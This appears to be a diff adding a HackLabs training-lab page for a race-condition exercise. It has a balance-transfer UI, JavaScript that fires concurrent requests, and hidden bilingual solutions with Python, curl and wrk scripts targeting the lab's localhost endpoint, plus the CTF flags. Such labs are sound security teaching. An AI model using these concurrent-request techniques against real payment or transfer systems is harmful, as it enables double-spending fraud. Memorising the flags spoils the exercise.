@@ -1,0 +1,261 @@
+{% extends "base.html" %}
+{% block title %}Race Condition – HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm text-gray-500 dark:text-gray-400 mb-3" data-i18n="race_balances">Balances</h2>
+    <div class="flex gap-4 mb-5">
+      <div class="flex-1 rounded-lg p-4 text-center" style="border:1px solid rgba(var(--hl-primary-rgb),.25);background:rgba(var(--hl-primary-rgb),.05)">
+        <div class="text-xs text-gray-400 mb-1" data-i18n="race_alice">Alice</div>
+        <div id="alice-balance" class="text-2xl font-bold font-mono" style="color:var(--hl-primary)">${{ balances.alice | default('10.00') }}</div>
+      </div>
+      <div class="flex-1 rounded-lg p-4 text-center" style="border:1px solid rgba(var(--hl-primary-rgb),.25);background:rgba(var(--hl-primary-rgb),.05)">
+        <div class="text-xs text-gray-400 mb-1" data-i18n="race_bob">Bob</div>
+        <div id="bob-balance" class="text-2xl font-bold font-mono" style="color:var(--hl-primary)">${{ balances.bob | default('0.00') }}</div>
+      </div>
+    </div>
+
+    <form id="transfer-form" class="flex gap-2 mb-4">
+      <input type="number" id="transfer-amount" name="amount" value="500" min="1"
+             class="font-mono text-sm rounded-lg px-3 py-2 flex-1"
+             style="background:var(--bg-input,rgba(255,255,255,.07));border:1px solid rgba(255,255,255,.12);color:inherit"
+             placeholder="Amount (cents)">
+      <button type="submit" class="btn-primary" data-i18n="race_transfer_btn">Transfer Alice → Bob</button>
+    </form>
+
+    <form method="POST" action="/race/reset" id="reset-form" style="display:inline">
+      <button type="submit" class="text-sm px-4 py-2 rounded-lg transition"
+              style="border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.05);cursor:pointer;color:inherit"
+              data-i18n="race_reset_btn">Reset</button>
+    </form>
+  </div>
+
+  {% with messages = get_flashed_messages(with_categories=true) %}
+    {% if messages %}{% for category, msg in messages %}
+      <div class="alert-{{ category if category in ['success','warning','error'] else 'success' }} mb-4 text-sm font-mono">{{ msg }}</div>
+    {% endfor %}{% endif %}
+  {% endwith %}
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="race_attack_panel">Race Attack</h2>
+    <p class="text-xs text-gray-400 mb-3" data-i18n="race_attack_desc">Fires 10 concurrent transfer requests simultaneously. If Alice has $10.00 and the server has a race condition, Bob may end up with more than $10.00.</p>
+    <pre class="text-xs font-mono rounded-lg p-3 mb-3 overflow-x-auto"
+         style="background:rgba(0,0,0,.35);border:1px solid rgba(255,255,255,.08)">async function runRaceAttack() {
+  const reqs = Array.from({length: 10}, () =&gt;
+    fetch('/race/transfer', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({from: 'alice', to: 'bob', amount: 500})
+    }).then(r =&gt; r.json())
+  );
+  const results = await Promise.all(reqs);
+  return results;
+}</pre>
+    <button id="run-race-btn" class="btn-primary" data-i18n="race_run_btn">Run Race Attack</button>
+  </div>
+
+  <div class="hl-card mb-4">
+    <h2 class="font-semibold text-sm mb-3" data-i18n="race_log">Result Log</h2>
+    <ul id="result-log" class="font-mono text-xs space-y-1" style="max-height:16rem;overflow-y:auto">
+      <li class="text-gray-500 italic" data-i18n="race_log_empty">No transfers yet.</li>
+    </ul>
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Easy — Race Condition basica</h3>
+    <p>El servidor no usa lock. Múltiples requests concurrentes pueden pasar la validación de saldo al mismo tiempo.</p>
+    <ol>
+      <li>Observa que Alice tiene $10.00 y Bob $0.00.</li>
+      <li>Envía 10 requests simultáneos:
+        <pre>python3 -c "
+import requests, threading
+def transfer():
+    requests.post('http://localhost:5000/race/transfer',
+        json={'from':'alice','to':'bob','amount':500},
+        headers={'Content-Type':'application/json'})
+threads = [threading.Thread(target=transfer) for _ in range(10)]
+[t.start() for t in threads]
+[t.join() for t in threads]
+"</pre>
+        O usa el botón "Run Race Attack" en la interfaz.
+      </li>
+      <li>Observa que Bob recibe más de $10.00 (balance negativo en Alice). Race condition explotada.</li>
+      <li>Flag: <code>HL{r4c3_c0nd1t10n_3z}</code></li>
+    </ol>
+
+    <h3>Medium — TOCTOU</h3>
+    <p>El check ocurre fuera del lock (Time-Of-Check Time-Of-Use). Misma técnica pero puede requerir más intentos.</p>
+    <ol>
+      <li>Reinicia los balances y lanza 20 requests paralelos:
+        <pre>for i in $(seq 1 20); do
+  curl -s -X POST http://localhost:5000/race/transfer \
+    -H 'Content-Type: application/json' \
+    -d '{"from":"alice","to":"bob","amount":500}' &amp;
+done; wait</pre>
+      </li>
+      <li>Flag: <code>HL{t0ct0u_m3d1um}</code></li>
+    </ol>
+
+    <h3>Hard — Lock bien implementado</h3>
+    <p>El lock está bien implementado. Requiere timing muy preciso o muchos hilos simultáneos.</p>
+    <ol>
+      <li>Usa Turbo Intruder (Burp Suite) o wrk/siege para saturar con 50+ threads:
+        <pre># Burp Turbo Intruder: envía el grupo de requests con "Send group (parallel)"
+# o con wrk:
+wrk -t50 -c50 -d5s -s post.lua http://localhost:5000/race/transfer</pre>
+      </li>
+      <li>Archivo post.lua:
+        <pre>wrk.method = "POST"
+wrk.headers["Content-Type"] = "application/json"
+wrk.body = '{"from":"alice","to":"bob","amount":500}'</pre>
+      </li>
+      <li>Flag: <code>HL{h4rd_r4c3_pr3c1s10n}</code></li>
+    </ol>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Python threading</span> <span class="tools-badge">Burp Turbo Intruder</span> <span class="tools-badge">wrk</span> <span class="tools-badge">siege</span></div>
+  </div>
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Easy — Basic Race Condition</h3>
+    <p>The server uses no lock. Multiple concurrent requests can pass the balance check simultaneously.</p>
+    <ol>
+      <li>Note that Alice has $10.00 and Bob has $0.00.</li>
+      <li>Send 10 simultaneous requests:
+        <pre>python3 -c "
+import requests, threading
+def transfer():
+    requests.post('http://localhost:5000/race/transfer',
+        json={'from':'alice','to':'bob','amount':500},
+        headers={'Content-Type':'application/json'})
+threads = [threading.Thread(target=transfer) for _ in range(10)]
+[t.start() for t in threads]
+[t.join() for t in threads]
+"</pre>
+        Or click the "Run Race Attack" button in the UI.
+      </li>
+      <li>Observe that Bob receives more than $10.00 (Alice's balance goes negative). Race condition exploited.</li>
+      <li>Flag: <code>HL{r4c3_c0nd1t10n_3z}</code></li>
+    </ol>
+
+    <h3>Medium — TOCTOU</h3>
+    <p>The check happens outside the lock (Time-Of-Check Time-Of-Use). Same technique but may require more attempts.</p>
+    <ol>
+      <li>Reset balances and fire 20 parallel requests:
+        <pre>for i in $(seq 1 20); do
+  curl -s -X POST http://localhost:5000/race/transfer \
+    -H 'Content-Type: application/json' \
+    -d '{"from":"alice","to":"bob","amount":500}' &amp;
+done; wait</pre>
+      </li>
+      <li>Flag: <code>HL{t0ct0u_m3d1um}</code></li>
+    </ol>
+
+    <h3>Hard — Proper lock implemented</h3>
+    <p>The lock is correctly implemented. Requires very precise timing or a large number of simultaneous threads.</p>
+    <ol>
+      <li>Use Burp Turbo Intruder or wrk/siege with 50+ threads:
+        <pre># Burp Turbo Intruder: send the request group with "Send group (parallel)"
+# or with wrk:
+wrk -t50 -c50 -d5s -s post.lua http://localhost:5000/race/transfer</pre>
+      </li>
+      <li>post.lua file:
+        <pre>wrk.method = "POST"
+wrk.headers["Content-Type"] = "application/json"
+wrk.body = '{"from":"alice","to":"bob","amount":500}'</pre>
+      </li>
+      <li>Flag: <code>HL{h4rd_r4c3_pr3c1s10n}</code></li>
+    </ol>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">curl</span> <span class="tools-badge">Python threading</span> <span class="tools-badge">Burp Turbo Intruder</span> <span class="tools-badge">wrk</span> <span class="tools-badge">siege</span></div>
+  </div>
+</div>
+
+<script>
+// ── Balance auto-refresh ──
+function refreshBalances() {
+  fetch('/race/balance')
+    .then(r => r.json())
+    .then(data => {
+      var a = document.getElementById('alice-balance');
+      var b = document.getElementById('bob-balance');
+      if (a) a.textContent = '$' + (data.alice / 100).toFixed(2);
+      if (b) b.textContent = '$' + (data.bob / 100).toFixed(2);
+    })
+    .catch(function() {});
+}
+setInterval(refreshBalances, 2000);
+
+// ── Single transfer form ──
+var transferForm = document.getElementById('transfer-form');
+if (transferForm) {
+  transferForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    var amount = parseInt(document.getElementById('transfer-amount').value, 10) || 500;
+    fetch('/race/transfer', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({from: 'alice', to: 'bob', amount: amount})
+    })
+    .then(r => r.json())
+    .then(data => {
+      logResult(data);
+      refreshBalances();
+    })
+    .catch(function(err) { logResult({error: String(err)}); });
+  });
+}
+
+// ── Reset form (AJAX) ──
+var resetForm = document.getElementById('reset-form');
+if (resetForm) {
+  resetForm.addEventListener('submit', function(e) {
+    e.preventDefault();
+    fetch('/race/reset', {method: 'POST', headers: {'Content-Type': 'application/json'}})
+      .then(r => r.json())
+      .then(function() { refreshBalances(); })
+      .catch(function() {});
+  });
+}
+
+// ── Race attack button ──
+async function runRaceAttack() {
+  var amount = parseInt((document.getElementById('transfer-amount') || {}).value, 10) || 500;
+  const reqs = Array.from({length: 10}, () =>
+    fetch('/race/transfer', {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({from: 'alice', to: 'bob', amount: amount})
+    }).then(r => r.json())
+  );
+  const results = await Promise.all(reqs);
+  results.forEach(r => logResult(r));
+  refreshBalances();
+  return results;
+}
+
+var raceBtn = document.getElementById('run-race-btn');
+if (raceBtn) {
+  raceBtn.addEventListener('click', function() {
+    raceBtn.disabled = true;
+    runRaceAttack().finally(function() { raceBtn.disabled = false; });
+  });
+}
+
+// ── Log helper ──
+var logEntries = [];
+function logResult(data) {
+  logEntries.unshift(JSON.stringify(data));
+  if (logEntries.length > 10) logEntries = logEntries.slice(0, 10);
+  var ul = document.getElementById('result-log');
+  if (!ul) return;
+  ul.innerHTML = logEntries.map(function(e) {
+    return '<li class="text-gray-300">' + e.replace(/</g, '&lt;') + '</li>';
+  }).join('');
+}
+</script>
+{% endblock %}
